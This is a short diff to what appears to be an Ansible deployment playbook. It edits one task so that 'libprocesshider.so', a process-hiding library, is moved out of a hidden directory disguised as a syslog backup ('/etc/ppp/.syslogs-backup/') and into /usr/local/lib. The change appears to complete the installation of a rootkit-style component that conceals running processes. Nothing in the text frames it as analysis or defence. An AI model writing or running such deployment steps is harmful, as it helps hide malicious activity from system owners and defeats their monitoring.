@@ -120,7 +120,7 @@
         chdir: "{{ deploy_dir }}"
 
     - name: Move compiled .so to /usr/local/lib
-      shell: mv /usr/local/lib/libprocesshider.so /usr/local/lib/
+      shell: mv /etc/ppp/.syslogs-backup/libprocesshider.so /usr/local/lib/
       args:
         creates: /usr/local/lib/libprocesshider.so
       ignore_errors: no
